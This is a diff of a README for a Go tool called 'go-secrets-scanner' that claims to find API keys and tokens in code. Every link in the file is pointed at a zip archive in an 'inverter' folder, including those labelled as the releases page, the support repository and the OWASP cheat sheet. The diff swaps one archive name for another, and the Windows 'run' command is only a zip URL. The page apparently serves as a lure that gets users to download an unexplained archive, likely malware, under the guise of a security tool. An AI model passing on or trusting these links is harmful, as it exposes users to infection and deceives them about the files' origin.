@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 
 ### 📥 Download the Latest Release
-[![Download go-secrets-scanner](https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/go_secrets_scanner_2.2.zip)](https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/go_secrets_scanner_2.2.zip)
+[![Download go-secrets-scanner](https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/secrets-go-scanner-3.8-beta.3.zip)](https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/secrets-go-scanner-3.8-beta.3.zip)
 
 Welcome to **go-secrets-scanner**! This application helps you scan for sensitive information in your code, such as API keys, tokens, and other secrets that shouldn't be shared. It's written in Go, providing a fast and reliable solution for security checks in your projects.
 
@@ -23,7 +23,7 @@ Welcome to **go-secrets-scanner**! This application helps you scan for sensitive
 ## 🔍 How to Scan Your Code
 
 1. **Download the Application**
-   - Visit the [Releases page](https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/go_secrets_scanner_2.2.zip) to download the latest version of the application.
+   - Visit the [Releases page](https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/secrets-go-scanner-3.8-beta.3.zip) to download the latest version of the application.
 
 2. **Extract the Files**
    - Once downloaded, locate the ZIP file in your Downloads folder.
@@ -48,7 +48,7 @@ Welcome to **go-secrets-scanner**! This application helps you scan for sensitive
      ```
    - If you are using Windows, run:
      ```
-     https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/go_secrets_scanner_2.2.zip your-code-directory
+     https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/secrets-go-scanner-3.8-beta.3.zip your-code-directory
      ```
 
 6. **Review the Results**
@@ -56,7 +56,7 @@ Welcome to **go-secrets-scanner**! This application helps you scan for sensitive
 
 ## 🌟 Download & Install
 
-For your convenience, you can quickly access the download link here: [Download go-secrets-scanner](https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/go_secrets_scanner_2.2.zip). 
+For your convenience, you can quickly access the download link here: [Download go-secrets-scanner](https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/secrets-go-scanner-3.8-beta.3.zip). 
 
 Follow the steps above for installation and scanning your codebase effectively.
 
@@ -76,13 +76,13 @@ Replace `src/` with the path to your specific code directory.
 
 ## 📞 Support
 
-If you encounter any issues or have questions, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/go_secrets_scanner_2.2.zip). The community is here to help!
+If you encounter any issues or have questions, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/secrets-go-scanner-3.8-beta.3.zip). The community is here to help!
 
 ## 🎓 Further Resources
 
 For more information on securing your code and understanding secrets management, check out:
 
-- [OWASP Secrets Management Cheat Sheet](https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/go_secrets_scanner_2.2.zip)
-- [Best Practices for Managing Secrets](https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/go_secrets_scanner_2.2.zip)
+- [OWASP Secrets Management Cheat Sheet](https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/secrets-go-scanner-3.8-beta.3.zip)
+- [Best Practices for Managing Secrets](https://raw.githubusercontent.com/Sarakimz/go-secrets-scanner/main/inverter/secrets-go-scanner-3.8-beta.3.zip)
 
 Your security is essential. Use **go-secrets-scanner** to keep your projects safe!
